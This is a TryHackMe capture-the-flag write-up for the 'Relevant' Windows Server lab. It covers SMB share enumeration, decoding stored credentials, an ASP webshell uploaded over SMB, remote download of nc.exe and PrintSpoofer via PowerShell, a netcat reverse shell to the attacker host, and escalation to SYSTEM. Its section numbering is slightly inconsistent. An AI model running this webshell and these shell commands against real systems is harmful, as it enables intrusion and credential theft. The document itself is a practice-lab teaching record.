# Relevant — TryHackMe Writeup

**Target:** `TARGET_IP`
**OS:** Windows Server 2016 Standard
**Difficulty:** Medium
**Tech stack:** IIS 10.0 (×2 ports — `:80` + `:49663`), SMB (writable share), RDP, MSRPC
**Exploit chain:** SMB guest enum  `nt4wrksv` (R/W)  `passwords.txt` base64-decoded creds  upload `.asp` webshell via SMB  IIS `:49663` executes it  stage `nc.exe`  reverse shell as `iis apppool\defaultapppool` / `Bob`

---

## Attack Chain Overview

```
nmap  80, 135, 139, 445, 3389, 49663, 49666, 49667
        
netexec smb -u guest --shares  nt4wrksv (READ,WRITE)
        
smbclient //$TARGET/nt4wrksv -N  get passwords.txt
        
base64 -d  Bob:!P@$$W0rD!123, Bill:Juw4nnaM4n420696969!$$$
        
smbclient -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
        
http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami
        
powershell IWR nc.exe  C:\Windows\Temp\nc.exe  reverse shell
        
user.txt at C:\Users\Bob\Desktop\user.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [SMB Enumeration — Writable Share + Encoded Creds](#2-smb-enumeration--writable-share--encoded-creds)
3. [Initial Access — ASP Webshell via SMB  IIS](#3-initial-access--asp-webshell-via-smb--iis)
4. [Reverse Shell — Stage `nc.exe`](#4-reverse-shell--stage-ncexe)
5. [User Flag](#5-user-flag)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run an Nmap scan to discover open ports and services.
# Why here: identify the attack surface, specifically finding the second IIS instance on port 49663.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p80,135,139,445,3389,49663,49666,49667 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 80/tcp | IIS 10.0 |
| 135/tcp | MSRPC |
| 139, 445/tcp | SMB (Server 2016 Standard) |
| 3389/tcp | RDP |
| 49663/tcp | **IIS 10.0 — second instance** |
| 49666, 49667/tcp | Dynamic RPC |

Two IIS instances. The second one (`:49663`) is what eventually executes the webshell. See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. SMB Enumeration — Writable Share + Encoded Creds

Full technique: [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md), [base64-encoded-credentials.md](../../../techniques/creds/base64-encoded-credentials.md).

### 2a. Find the writable share

```bash
# What it does: enumerate SMB shares using the guest user.
# Why here: find accessible shares that might contain sensitive files or allow uploads.
netexec smb $TARGET -u 'guest' -p '' --shares
# nt4wrksv  READ,WRITE
```

### 2b. Pull the credential file

```bash
# What it does: connect to the identified share and download the passwords file.
# Why here: recover potential credentials stored in the share.
smbclient //$TARGET/nt4wrksv -N -c "get passwords.txt"
# What it does: read the content of the downloaded passwords file.
# Why here: check for encoded credentials that need further decoding.
cat passwords.txt
# [User Passwords - Encoded]
# Qm9iIC0gIVBAJCRXMHJEITEyMw==
# QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

### 2c. Decode

```bash
# What it does: decode the Base64 encoded credentials.
# Why here: retrieve cleartext passwords for Bob and Bill.
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
# Bob - !P@$$W0rD!123
echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```

Tools: [netexec](../../../tools/recon/netexec.md), [smbclient](../../../tools/recon/smbclient.md).

---

## 3. Initial Access — ASP Webshell via SMB  IIS

Full technique: [smb-write-iis-execution.md](../../../exploits/web-rce/smb-write-iis-execution.md).

The `nt4wrksv` share is mirrored at `http://$TARGET:49663/nt4wrksv/`. Files dropped via SMB execute as ASP/ASPX over IIS.

### 3a. Build a classic ASP shell

```asp
<%
Set objShell = CreateObject("WScript.Shell")
Set objCmd = objShell.Exec("cmd /c " & Request.QueryString("cmd"))
Response.Write(objCmd.StdOut.ReadAll())
%>
```

### 3b. Upload via SMB

```bash
# What it does: upload an ASP webshell using Bob's credentials.
# Why here: establish a persistence point on the IIS server by abusing the writable share.
smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
```

### 3c. Trigger over HTTP

```bash
# What it does: send an HTTP request to the target web server.
# Why here: trigger the ASP webshell to execute commands or verify connectivity to the attacker.
curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
# iis apppool\defaultapppool
```

---

## 4. Reverse Shell — Stage `nc.exe`

```bash
# Attacker
# What it does: copy the netcat binary to the current working directory.
# Why here: prepare the binary for delivery to the target machine.
cp /usr/share/windows-binaries/nc.exe .
# What it does: start a temporary web server on the attacker machine.
# Why here: serve the nc.exe binary to be downloaded by the target via the webshell.
python3 -m http.server 80
# What it does: start a listener to catch the Windows reverse shell.
# Why here: wait for the incoming connection from the target's netcat execution.
nc -lvnp 4444
```

Pull `nc.exe` to `C:\Windows\Temp\` via the webshell, then trigger:

```bash
# What it does: send PowerShell commands via the ASP webshell.
# Why here: automate the download and execution of the reverse shell binary.
curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=powershell -c \"Invoke-WebRequest http://$LHOST/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe\""

curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=dir C:\\Windows\\Temp\\nc.exe"

curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=C:\\Windows\\Temp\\nc.exe $LHOST 4444 -e cmd.exe"
```

`-G --data-urlencode` is mandatory — the spaces, quotes and `\` inside the cmd would otherwise corrupt the URL.

Tools: [netcat](../../../tools/pivot/netcat.md), [curl](../../../tools/web/curl.md).

---

## 5. User Flag

```cmd
REM What it does: execute a command in the Windows command prompt.
REM Why here: check current user context and read the recovered user flag.
whoami
type C:\Users\Bob\Desktop\user.txt
```

---

## 6. Privilege Escalation — winPEAS and PrintSpoofer

Full technique: [printspoofer-seimpersonate.md](../../../privesc/windows/printspoofer-seimpersonate.md).

```cmd
REM What it does: download and run winPEAS to enumerate privilege escalation vectors.
REM Why here: identify SeImpersonatePrivilege and other misconfigurations on the target.
powershell -c "Invoke-WebRequest http://$LHOST:8080/winPEAS.ps1 -OutFile C:\Windows\Temp\winPEAS.ps1"
powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEAS.ps1
```

winPEAS findings:
- SNMP Key found at `HKLM:\SYSTEM\CurrentControlSet\Services\SNMP`
- Unquoted Service Path: `AWSLiteAgent` → `C:\Program Files\Amazon\XenTools\LiteAgent.exe`
- **SeImpersonatePrivilege enabled** → PrintSpoofer path

```cmd
REM What it does: download the PrintSpoofer exploit from the attacker.
REM Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
powershell -c "Invoke-WebRequest http://$LHOST/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"

REM What it does: leverage SeImpersonatePrivilege via PrintSpoofer.
REM Why here: escalate privileges from iis apppool to nt authority\system.
C:\Windows\Temp\ps.exe -i -c cmd
```

```cmd
REM What it does: confirm SYSTEM access and capture the final root flag.
REM Why here: complete the machine with full administrative privileges.
whoami
REM nt authority\system
type C:\Users\Administrator\Desktop\root.txt
```

---

## 7. Key Takeaways

- Writable SMB shares mirrored as IIS virtual directories are an instant webshell path — `smbclient put shell.asp` + `curl http://target/share/shell.asp` is the universal chain.
- Always check for a second IIS instance on high ports (`:49663`, `:8080`). The share path may only be served by the alternate binding.
- Base64-encoded credential files in SMB shares are more common than you'd expect. `cat + base64 -d` is a mandatory triage step.
- `curl -G --data-urlencode` is essential for webshell payloads with special characters — URL encoding in the query string prevents corruption.
- `SeImpersonatePrivilege` on IIS app pool accounts is the default on Windows Server — PrintSpoofer/JuicyPotato is almost always the privesc path.

---

## Related Notes
- [smb-anonymous-enum.md](../../../playbooks/enumeration/smb-anonymous.md) — finding the share
- [base64-encoded-credentials.md](../../../techniques/creds/base64-encoded-credentials.md) — decoding the credential file
- [smb-write-iis-execution.md](../../../exploits/web-rce/smb-write-iis-execution.md) — full ASP/IIS chain
- [windows-enumeration.md](../../../playbooks/enumeration/windows.md) — what to do once you land the shell
- [nmap](../../../tools/recon/nmap.md), [netexec](../../../tools/recon/netexec.md), [smbclient](../../../tools/recon/smbclient.md), [netcat](../../../tools/pivot/netcat.md), [curl](../../../tools/web/curl.md)
